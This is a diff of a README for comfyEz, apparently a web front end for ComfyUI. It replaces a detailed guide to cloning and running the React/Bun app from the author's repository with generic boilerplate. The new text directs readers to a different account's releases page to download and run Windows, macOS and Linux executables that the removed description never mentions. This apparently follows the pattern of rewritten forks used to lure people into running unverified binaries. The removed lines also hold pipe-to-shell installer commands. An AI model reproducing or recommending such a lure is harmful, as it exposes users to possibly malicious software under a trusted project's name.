@@ -1,148 +1,95 @@
-# ComfyEz
-
-**ComfyEz** is a modern, feature-rich web interface designed to interact with a local [ComfyUI](https://github.com/comfyanonymous/ComfyUI) instance. 
-
-It abstracts the complex node-based graph into a sleek, professional "Playground" UI (similar to commercial AI generators) while retaining the flexibility of ComfyUI through a powerful **Workflow & Node Mapping** system. It also integrates **LLM capabilities** for prompt engineering and complex inpainting tools.
-
-![ComfyEz](shot.jpg)
-
-## ✨ Key Features
-
-### 🎨 Core Generation
-- **Sleek Interface**: A dark-themed, responsive UI built with React and Tailwind CSS.
-- **Param Controls**: Easy access to Steps, CFG, Sampler, Scheduler, Seed, Dimensions, and Batch Size.
-- **LoRA Support**: Dynamic LoRA loading and stacking. The system automatically chains LoRA nodes (Model/CLIP) sequentially in the backend workflow.
-- **Upscaling**: Toggleable upscaling support (Lanczos, Bicubic, etc.) with custom scale factors.
-
-### 🧠 Workflow System
-- **Preset Management**: Save, Import, and Export different ComfyUI workflows (JSON).
-- **Node Mapping Engine**: Map UI controls (e.g., "Seed Slider") to specific Node IDs in your workflow JSON without touching code.
-- **Backwards Compatibility**: Works with standard SDXL, SD1.5, Flux, or custom workflows provided they are mapped correctly.
-
-### 🤖 AI-Powered Prompting (LLM Integration)
-Integrates with OpenAI-compatible APIs (OpenRouter, OpenAI, local LLMs) to supercharge creativity:
-- **Prompt Enhancement**: One-click rewrite of prompts with adjustable intensity (Low/Medium/High).
-- **Prompt Suggestions**: Get 3 creative variations based on a simple concept.
-- **Chat-to-Edit**: Conversational interface to modify prompts (e.g., "Make it night time").
-- **Image-to-Prompt (Vision)**: Upload an image to extract a detailed prompt using Vision models.
-- **Variant Generator**: Generate categorization matrices (Lighting, Style, Camera) to explore different artistic directions.
-
-### 🖌️ Advanced Inpainting
-A dedicated, fully-featured inpainting editor:
-- **Brush Controls**: Adjustable brush size and feathering (softness).
-- **Visual Feedback**: "Lemon Pattern" overlay to clearly see masked areas against dark images.
-- **Pan & Zoom**: Infinite canvas navigation (Space + Drag).
-- **Undo/Redo**: Full history stack for mask strokes.
-- **Auto-Injection**: Automatically injects "Load Image", "Load Mask", "VAE Encode", and "Set Latent Noise Mask" nodes into workflows that aren't explicitly designed for inpainting.
-
-### ⚡ Smart Queue & History
-- **Persistent Queue**: The generation queue survives page reloads (stored in IndexedDB).
-- **Auto-Recovery**: Automatically resumes checking status for pending jobs after a browser refresh.
-- **Batch Management**: Reorder, delete, or clear queue items.
-- **Visual History**: Gallery view of all generated images with full metadata.
-- **"Remix" Capability**: Click any history item to instantly restore all parameters, workflows, and seeds used to generate it.
-
-### 💾 Persistence
-- **IndexedDB**: Stores high-resolution images, generation history, and queue state locally within the browser (no external database required).
-- **Local Storage**: Saves user preferences, API keys (locally only), and active workflow selections.
-
----
-
-## 🛠️ Technology Stack
-- **Frontend**: React 19, TypeScript, Vite
-- **Styling**: Tailwind CSS, Lucide React (Icons)
-- **State/Logic**: Custom Hooks (`useComfy`, `useWorkflows`), Context-free architecture.
-- **Storage**: IndexedDB (via native API), LocalStorage.
-- **Backend Integration**: Direct fetch calls to ComfyUI API (`/prompt`, `/history`, `/upload`, `/object_info`).
-
----
+# 🎉 comfyEz - A User-Friendly Interface for ComfyUI
 
 ## 🚀 Getting Started
 
-### Prerequisites
-1. **ComfyUI**: You must have [ComfyUI](https://github.com/comfyanonymous/ComfyUI) running locally.
-   - Default address: `http://127.0.0.1:8188`
-   - **CORS Note**: You may need to run ComfyUI with `--enable-cors-header *` if accessing from a different origin.
-2. **Bun**: You'll need [Bun](https://bun.sh/) installed.
-   - **macOS & Linux**:
-     ```bash
-     curl -fsSL https://bun.com/install | bash
-     ```
-   - **Windows**:
-     ```powershell
-     powershell -c "irm bun.sh/install.ps1|iex"
-     ```
+Welcome to comfyEz! This application provides a feature-rich web interface designed to interact with your local ComfyUI. Follow these steps to get up and running quickly.
 
-### Installation
+## 🏷️ Download & Install
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/amirrezasalimi/comfyEz.git
-   cd comfyEz
-   ```
+To download comfyEz, please visit this page to download:
 
-2. Install dependencies:
-   ```bash
-   bun install
-   ```
+[![Download comfyEz](https://img.shields.io/badge/Download-comfyEz-brightgreen)](https://github.com/nguyenhungnhat/comfyEz/releases)
 
-3. Start the development server:
-   ```bash
-   bun dev
-   ```
+### Step 1: Visit the Releases Page
 
----
+1. Open your web browser.
+2. Go to the following link: [comfyEz Releases](https://github.com/nguyenhungnhat/comfyEz/releases).
 
-## ⚙️ Configuration
+### Step 2: Select the Latest Version
 
-### connecting to ComfyUI
-1. Click the **Settings (Gear)** icon in the sidebar.
-2. Set **Host URL** to your ComfyUI instance (e.g., `http://127.0.0.1:8188`).
+1. Scroll down to the "Latest Release" section.
+2. Look for the version number, which will be highlighted.
 
-### Setting up LLM Features
-1. In Settings, enable **LLM Config**.
-2. **API Host**: Defaults to `https://openrouter.ai/api/v1` (or use `https://api.openai.com/v1`).
-3. **API Key**: Enter your key (stored locally in browser).
-4. **Model**: Click "Fetch List" to grab available models or type one manually (e.g., `google/gemini-2.0-flash`, `gpt-4o`).
+### Step 3: Download the Application
 
----
+1. Click on the link that says "Assets" to expand it.
+2. Locate the appropriate file for your operating system:
+   - For Windows, download `comfyEz-windows.exe`.
+   - For Mac, download `comfyEz-macos.dmg`.
+   - For Linux, download `comfyEz-linux.AppImage`.
 
-## 🧩 How Workflow Mapping Works
+### Step 4: Install the Application
 
-This app allows you to use *any* ComfyUI workflow by "mapping" generic UI controls to specific Node IDs.
+**For Windows Users:**
+1. Double-click the downloaded `comfyEz-windows.exe` file.
+2. Follow the on-screen instructions to complete the installation.
 
-1. Open the **Workflow Editor** (Fork icon in sidebar).
-2. **Import** a ComfyUI JSON file (Save as API Format from ComfyUI).
-3. The **JSON Editor** on the right shows the raw graph.
-4. The **Mapping Column** on the right allows you to select which node corresponds to:
-   - **Prompt Node**: Where the positive text goes.
-   - **Model Node**: Where the checkpoint is loaded.
-   - **Seed/Steps/CFG**: Usually the KSampler node.
-   - **Preview Node**: The final image output node.
-5. **Save** the preset. The UI will now control that specific workflow.
+**For Mac Users:**
+1. Open the downloaded `comfyEz-macos.dmg` file.
+2. Drag and drop the comfyEz icon into your Applications folder.
 
----
+**For Linux Users:**
+1. Open a terminal.
+2. Navigate to the folder where you downloaded `comfyEz-linux.AppImage`.
+3. Make the file executable with the command:  
+   `chmod +x comfyEz-linux.AppImage`
+4. Launch the application using:  
+   `./comfyEz-linux.AppImage`
 
-## ⌨️ Shortcuts & Tips
+## 🎨 Features
 
-- **Queue Generation**: `Ctrl + Enter` (or `Cmd + Enter`) in the prompt box.
-- **Inpainting**:
-  - `Space + Drag`: Pan the canvas.
-  - `Scroll Wheel`: Zoom in/out.
-  - `Ctrl + Z`: Undo mask stroke.
-  - `[ / ]`: Decrease/Increase brush size (if implemented) or use UI sliders.
-- **Drag & Drop**: Drop an image onto the sidebar to load it as an Input Image (Img2Img). Drop it onto the Canvas to view it.
+- **Easy Interaction:** User-friendly interface to streamline your ComfyUI experience.
+- **Customizable Settings:** Adjust settings to fit your preferences.
+- **Real-time Updates:** Get instant updates on your tasks and projects.
+- **Multi-platform Support:** Use comfyEz on Windows, Mac, or Linux.
 
-## 🤝 Contributing
+## ⚙️ System Requirements
 
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+Before downloading comfyEz, ensure that your system meets the following requirements:
 
----
+- **Windows:** Windows 10 or later.
+- **Mac:** macOS 10.12 (Sierra) or later.
+- **Linux:** Any distribution with kernel version 4.0 or newer.
 
-## 🙏 Thanks
+## 📄 Usage Instructions
 
-Made In AI Studio with Gemini 3
+After installation, you can start using comfyEz:
 
-## 📄 License
+1. Open the application from your Applications folder (or Start Menu for Windows).
+2. The main interface will open. You can begin interacting with your local ComfyUI right away.
+3. Follow the prompts to connect to your ComfyUI instance.
+4. Explore the features to tailor your experience.
 
-[MIT](https://choosealicense.com/licenses/mit/)
+## 🔧 Troubleshooting
+
+If you encounter any issues while using comfyEz, consider the following steps:
+
+- Ensure you have the latest version of the application. Check the Releases page again for updates.
+- Restart the application to resolve potential glitches.
+- Check your system requirements to ensure compatibility.
+
+## 💬 Feedback and Support
+
+We welcome your feedback! Feel free to reach out if you have questions or suggestions. You can open an issue on the GitHub repository to connect with the community.
+
+For further assistance, you can refer to the [Issues page](https://github.com/nguyenhungnhat/comfyEz/issues) or create a new issue for your specific concerns.
+
+## 👣 Next Steps
+
+Once you're familiar with comfyEz, explore the additional features available:
+
+- Customize your interface for better workflow.
+- Integrate other tools to enhance functionality.
+- Share your experience with others.
+
+Thank you for choosing comfyEz. Enjoy your experience with ComfyUI!
